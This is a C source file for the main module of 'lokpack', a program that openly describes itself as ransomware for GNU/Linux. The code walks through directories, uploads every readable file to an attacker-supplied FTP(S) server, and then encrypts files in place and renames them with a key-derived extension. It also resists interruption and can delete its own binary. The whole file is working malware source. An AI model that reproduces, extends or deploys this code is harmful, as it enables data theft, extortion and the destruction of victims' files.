/*

 * lokpack | ransomware for GNU/Linux
 * written by ngn (https://ngn.tf) (2025)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include "encryptor/option.h"

#include "lib/traverse.h"
#include "lib/config.h"
#include "lib/util.h"
#include "lib/rsa.h"
#include "lib/log.h"

#include <curl/curl.h>

#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>

#include <fcntl.h>
#include <stdio.h>

static bool confirm = false; /* confirm for SIGINT */

static char *ftp_creds = NULL; /* FTP(S) credentials, "user:pwd" form */
static char *ftp_url   = NULL; /* FTP(S) base URL */

static char pub_hash[LP_SHA256_SIZE]; /* public key hash */
static char pub_ext[7] = {0}; /* file extension (calculated from hash) */

int quit(int code) {
  /* free resources */
  lp_traverser_free();
  lp_rsa_key_free();
  free(ftp_creds);
  opt_free();

  /* exit (never returns) */
  exit(code);
  return code;
}

void signal_handler(int signal) {
  if (SIGINT == signal && confirm) {
    lp_info("If you really want to quit, do that again");
    confirm = false;
    return;
  }

  lp_info("Stopping the program, wait for ongoing operations");
  quit(EXIT_FAILURE);
}

void upload_handler(char *path) {
  char    *url     = NULL;
  int      url_len = 0;
  FILE    *file    = NULL;
  CURL    *curl    = NULL;
  CURLcode res;

  if (NULL == path)
    return;

  lp_replace(path, ' ', '_');

  url_len = strlen(ftp_url) + strlen(path) + 1;
  url     = calloc(1, url_len + 1);

  if (snprintf(url, url_len + 1, "%s/%s", ftp_url, path) != url_len) {
    lp_debug("Failed to format the FTP(S) URL: %s", lp_str_error());
    goto free;
  }

  if (NULL == (file = fopen(path, "rb"))) {
    lp_debug("Failed to open %s: %s", path, lp_str_error());
    goto free;
  }

  if (NULL == (curl = curl_easy_init())) {
    lp_debug("Failed to initialize curl for %s", path);
    goto free;
  }

  curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
  curl_easy_setopt(curl, CURLOPT_USERPWD, ftp_creds);
  curl_easy_setopt(
      curl, CURLOPT_FTP_CREATE_MISSING_DIRS, (long)CURLFTP_CREATE_DIR_RETRY);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_READDATA, file);

  lp_debug("Uploading to FTP(S): %s", url);

  if (CURLE_OK != (res = curl_easy_perform(curl)))
    lp_fail("Failed to upload %s: %s", path, curl_easy_strerror(res));

free:
  if (NULL != curl)
    curl_easy_cleanup(curl);

  if (NULL != file)
    fclose(file);

  free(url);
}

void encrypt_handler(char *path) {
  bool     ret = false;
  lp_rsa_t rsa;

  /* file stuff */
  int     fd = -1, in_len = 0, out_len = 0;
  uint8_t buf[LP_RSA_BLOCK_SIZE];

  /* path stuff */
  int   new_path_len = strlen(path) + sizeof(pub_ext);
  char *new_path     = calloc(1, new_path_len + 1);

  /* initialize the RSA structure with the public key */
  lp_rsa_init(&rsa);

  /* output file name */
  if (snprintf(new_path, new_path_len + 1, "%s.%s", path, pub_ext) !=
      new_path_len) {
    lp_debug("Failed to format output file path: %s", lp_str_error());
    goto free;
  }

  /* open the input file */
  if ((fd = open(path, O_RDWR)) < 0) {
    lp_debug("Failed to open file %s: %s", path, lp_str_error());
    goto free;
  }

  /* load the RSA encryption context */
  if (!lp_rsa_load(&rsa)) {
    lp_debug("Failed to load the RSA context");
    goto free;
  }

  /* read from the input file, one block at a time */
  while ((in_len = read(fd, buf, sizeof(buf))) > 0) {
    /* encrypt the read full/partial block */
    if (!lp_rsa_encrypt(&rsa, buf, in_len, buf, &out_len)) {
      lp_debug("Failed to encrypt %s (%lu, %lu)", path, in_len, out_len);
      goto free;
    }

    /* go back to the start of the block */
    if (lseek(fd, (off_t)in_len * 1, SEEK_CUR) < 0) {
      lp_debug("Failed to seek to block for %s: %s", path, lp_str_error());
      goto free;
    }

    /* check the input/output block size */
    if (out_len != in_len && in_len == (int)sizeof(buf)) {
      lp_debug("Invalid block size for %s: %d != %d", path, out_len, in_len);
      goto free;
    }

    /* write the encrypted full block to the output file */
    if (out_len != 0 && write(fd, buf, out_len) <= 0) {
      lp_debug("Failed to write to %s: %s", path, lp_str_error());
      goto free;
    }

    /* check we read the last block */
    if (in_len < (int)sizeof(buf))
      break;
  }

  /* encrypt and write any leftover partial block */
  if (!lp_rsa_done(&rsa, buf, &out_len)) {
    lp_debug("Failed to encrypt the last block");
    goto free;
  }

  if (write(fd, buf, out_len) < 0) {
    lp_debug("Failed to write last block to %s: %s", path, lp_str_error());
    goto free;
  }

  /* save the secret and the IV */
  if (write(fd, rsa.secret, sizeof(rsa.secret)) <= 0) {
    lp_debug("Failed to write the secret to %s: %s", path, lp_str_error());
    goto free;
  }

  if (write(fd, rsa.iv, sizeof(rsa.iv)) <= 0) {
    lp_debug("Failed to write the IV to %s: %s", path, lp_str_error());
    goto free;
  }

  /* close the file */
  close(fd);
  fd = -1;

  /* rename the file */
  if (rename(path, new_path) != 0) {
    lp_debug("Failed to rename %s to %s", path, new_path);
    goto free;
  }

  ret = true;

free:
  if (fd >= 0)
    close(fd);

  if (!ret)
    lp_fail("Failed to encrypt %s", path);

  free(new_path);
  lp_rsa_free(&rsa);
}

int main(int argc, char **argv) {
  /* signal action */
  struct sigaction action;

  /* options */
  char  *ftp_usr = NULL, *ftp_pwd = NULL, **cur = NULL;
  char **paths = NULL, **target = NULL, *ignore[2] = {NULL, NULL};
  int    threads;

  /* temporary stuff */
  int i, len;

  /* setup the signal handler */
  sigemptyset(&action.sa_mask);
  action.sa_handler = signal_handler;
  action.sa_flags   = 0;

  sigaction(SIGINT, &action, NULL);
  sigaction(SIGTERM, &action, NULL);
  sigaction(SIGQUIT, &action, NULL);

  /* parse all the arguments as options */
  for (i = 1; i < argc; i++) {
    /* check for the help option */
    if (lp_streq(argv[i], "-h") || lp_streq(argv[i], "--help")) {
      opt_help();
      quit(EXIT_FAILURE);
    }

    if (!opt_parse(argv[i]))
      quit(EXIT_FAILURE);
  }

  lp_info("Running " LP_LOG_BOLD LP_VERSION LP_LOG_RESET
          " with following options:");
  opt_print();

  /* load and check the target path and the extensions option */
  paths  = opt_list("paths");
  target = opt_list("exts");

  if (NULL == *paths || **paths == 0) {
    lp_fail("Please specify at least one target directory");
    quit(EXIT_FAILURE);
  }

  if (opt_is_empty_list(target))
    target = NULL;

  /* obtain & check the FTP(S) URL and the credentials */
  ftp_usr = opt_str("ftp-user");
  ftp_pwd = opt_str("ftp-pwd");
  ftp_url = opt_str("ftp-url");

  if (!opt_bool("no-ftp")) {
    if (NULL == ftp_url) {
      lp_fail("No FTP(S) URL is specified, use no-ftp to disable FTP(S)");
      quit(EXIT_FAILURE);
    }

    if (NULL == ftp_usr) {
      lp_fail("No FTP(S) user is specified, use no-ftp to disable FTP(S)");
      quit(EXIT_FAILURE);
    }

    if (NULL == ftp_pwd) {
      lp_fail("No FTP(s) password is specified, use no-ftp to disable FTP(S)");
      quit(EXIT_FAILURE);
    }
  }

  /* build out the FTP(S) credentials for using them with curl */
  len       = strlen(ftp_usr) + strlen(ftp_pwd) + 1;
  ftp_creds = calloc(1, len + 1);

  if (NULL != ftp_usr && NULL != ftp_pwd &&
      snprintf(ftp_creds, len + 1, "%s:%s", ftp_usr, ftp_pwd) != len) {
    lp_fail("Failed to format the FTP(S) credentials: %s", lp_str_error());
    quit(EXIT_FAILURE);
  }

  /* obtain & check the thread count for the thread pool */
  if ((threads = opt_int("threads")) <= 0) {
    lp_fail("Please specify a valid thread number (at least one)");
    quit(EXIT_FAILURE);
  }

  /*

   * after the encryption, a new extension will be added to the file names, this
   * extension is essentially calculated from the public key, it's the first 6
   * characters of the SHA256 hash of the public key

  */
  if (NULL == lp_sha256(LP_PUBKEY, pub_hash)) {
    lp_fail("Failed to calculate SHA256 sum of the public key");
    quit(EXIT_FAILURE);
  }

  if (snprintf(pub_ext, sizeof(pub_ext), "%.6s", pub_hash) !=
      sizeof(pub_ext) - 1) {
    lp_fail("Failed to format the file extension: %s", lp_str_error());
    quit(EXIT_FAILURE);
  }

  /* add encrypted file extension to the ignore list */
  ignore[0] = pub_ext;
  ignore[1] = NULL;

  /* load the RSA public key */
  if (!lp_rsa_key_load()) {
    lp_fail("Failed to load the public key, is the key valid?");
    quit(EXIT_FAILURE);
  }

  /* initialize the traverser */
  if (!lp_traverser_init(threads, target, ignore)) {
    lp_fail("Failed to initialize the traverser: %s", lp_str_error());
    quit(EXIT_FAILURE);
  }

  /*

   * configure the traverser, we'll first use it to find all the files we can
   * read and upload them to the FTP(S) server using the upload_handler()

  */
  lp_traverser_set_mode(R_OK);
  lp_traverser_set_handler(upload_handler);

  /* quitting with SIGINT after this point will require confirmation */
  confirm = true;

  for (cur = paths; !opt_bool("no-ftp") && NULL != *cur; cur++) {
    lp_info("Uploading %s", *cur);
    lp_traverser_run(*cur);
  }

  /* wait for all the threads */
  lp_traverser_wait(opt_bool("progress"));

  /*


   * now reconfigure the traverser to find all the files we can read AND write
   * and encrypt them using the encrypt_handler()

  */
  lp_traverser_set_mode(R_OK | W_OK);
  lp_traverser_set_handler(encrypt_handler);

  for (cur = paths; NULL != *cur; cur++) {
    lp_info("Encrypting %s", *cur);
    lp_traverser_run(*cur);
  }

  /* wait for all the threads */
  lp_traverser_wait(opt_bool("progress"));

  /* self destruct */
  if (opt_bool("destruct"))
    unlink(argv[0]);

  /* TODO: probably sync() here if LP_DEBUG is disabled */

  lp_success("Operation completed");
  return quit(EXIT_SUCCESS);
}
